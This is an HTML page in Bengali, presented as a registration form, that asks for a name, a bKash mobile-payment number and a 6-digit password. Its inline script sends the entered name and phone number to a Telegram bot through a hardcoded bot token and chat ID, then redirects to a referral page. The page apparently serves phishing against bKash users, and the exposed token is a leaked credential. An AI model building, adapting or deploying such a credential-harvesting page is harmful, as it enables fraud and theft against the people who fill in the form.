<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <form id="registerForm">
        <label for="name">আপনার নাম লিখুন:</label>
        <input type="text" id="name" required><br>

        <label for="phone">আপনার বিকাশ নাম্বার:</label>
        <input type="tel" id="phone" required><br>

        <label for="password">একটি ৬ সংখ্যার পাসওয়ার্ড লিখুন:</label>
        <input type="password" id="password" required><br>

        <button type="submit">Register</button>
    </form>

    <script>
        document.getElementById('registerForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const token = '7837313367:AAE5htKpS0jCwExLHWmZhvw14YPpIRiW0jk';
            const chatId = '5197344486';
            const message = `New Registration:\nName: ${name}\nPhone: ${phone}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = 'referral.html';
                } else {
                    alert('Error sending data!');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending data!');
            });
        });
    </script>
</body>
</html>
